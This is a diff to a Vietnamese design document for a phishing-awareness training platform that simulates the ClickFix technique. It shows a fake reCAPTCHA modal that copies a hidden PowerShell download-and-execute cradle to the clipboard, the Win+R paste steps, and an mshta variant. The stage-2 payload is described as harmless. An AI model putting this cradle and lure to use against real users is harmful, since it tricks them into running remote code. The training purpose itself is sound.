@@ -32,7 +32,7 @@ thì gửi đúng một HTTP GET về server training để đánh dấu "user �
 Chuỗi bẫy ClickFix (training flow):
   Form đăng ký → token → modal "reCAPTCHA giả" → click checkbox
   → copy payload cradle ngắn vào clipboard (PowerShell chạy hidden):
-     powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>')" # ✅ ''I am not a robot…''
+     powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>' -UseBasicParsing)" # ✅ ''I am not a robot…''
   → user bấm Win+R → Ctrl+V → Enter
   → cradle tải stage-2 (/api/clickfix/s) rồi iex hidden:
       stage-2 tạo file vô hại C:\Temp\hehehe.txt + GET /api/clickfix/verify?t=<token>
@@ -197,15 +197,15 @@ Index: `alerts(status, created_at)`, `logs(timestamp/type/src/dst)`, `iocs(value
    (CSS `.cf-verify-*` giả lập cửa sổ xác minh màu xanh Google).
 2. Sinh `token` từ form, hiện modal với 3 bước: Win+R → Ctrl+V → Enter.
 3. Khi user click checkbox: spinner giả lập, sinh "Verification ID" 4 số, rồi
-   **copy payload cradle vào clipboard** (chạy hidden hoàn toàn, ~178 ký tự —
+   **copy payload cradle vào clipboard** (chạy hidden hoàn toàn, ~195 ký tự —
    vừa khít hộp Run và hiện đủ dòng "I am not a robot" để giữ ảo giác):
    ```
-   powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>')" # ✅ ''I am not a robot - reCAPTCHA Verification ID: <vid>''
+   powershell -w hidden -nop -ep bypass -c "iex(iwr '<origin>/api/clickfix/s?t=<token>' -UseBasicParsing)" # ✅ ''I am not a robot - reCAPTCHA Verification ID: <vid>''
    ```
    - `-w hidden -nop -ep bypass`: không cửa sổ, không profile, bỏ execution policy —
      đúng mẫu payload ClickFix thật; phần `# ✅ ...` phía sau là **comment của PowerShell**.
    - **2 giai đoạn như campaign thật**: cradle tải `GET /api/clickfix/s?t=<token>` (stage-2)
-     rồi `iex` hidden. Stage-2 **100% vô hại**: tạo `C:\Temp\hehehe.txt` chứa `Hehehehe`
+     rồi `iex` hidden (`-UseBasicParsing` bắt buộc với PS 5.1). Stage-2 **100% vô hại**: tạo `C:\Temp\hehehe.txt` chứa `Hehehehe`
      (artifact để trainee thấy "máy đã chạy payload" và analyst có chỗ hunt) + 1 GET verify.
    - Server ghi dấu vết `downloaded` khi stage-2 được tải (ai tải payload kể cả chưa chạy).
 4. **`frontend/verify.hta`** (biến thể dự phòng, chạy bằng `mshta`): VBScript parse token +
